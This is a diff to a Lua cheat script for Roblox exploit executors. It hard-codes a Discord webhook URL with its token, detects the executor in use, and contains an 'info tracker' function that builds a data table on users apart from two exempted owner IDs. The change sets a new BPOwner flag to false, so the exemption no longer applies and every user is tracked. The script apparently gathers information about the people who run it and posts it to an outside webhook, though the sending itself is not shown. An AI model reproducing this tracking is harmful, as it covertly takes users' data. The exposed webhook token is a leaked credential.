@@ -1,3 +1,4 @@
+local BPOwner = false
 local WeebHook = "https://discord.com/api/webhooks/1046955945621737502/HsniRn_0kRUhfXqIb5eI6csZqYwQwWOFm-d1ZJKwk4eoFvvELEnxsD8u_ow-koBGqNzB"
 local ExecutorUsing = is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or secure_load and "Sentinel" or KRNL_LOADED and "Krnl" or SONA_LOADED and "Sona" or "WTF?"
 local HttpService = game:GetService("HttpService")
@@ -14,7 +15,7 @@ local function GetSupportedGame()
 end
 local SupportedGame = GetSupportedGame()
 local InfoSpoofer = function()
-    if UserId == 860289947 or UserId == 446350986 then
+    if BPOwner and (UserId == 860289947 or UserId == 446350986) then
         print("Bypassed Info Tracker")
     else
         local Data = {
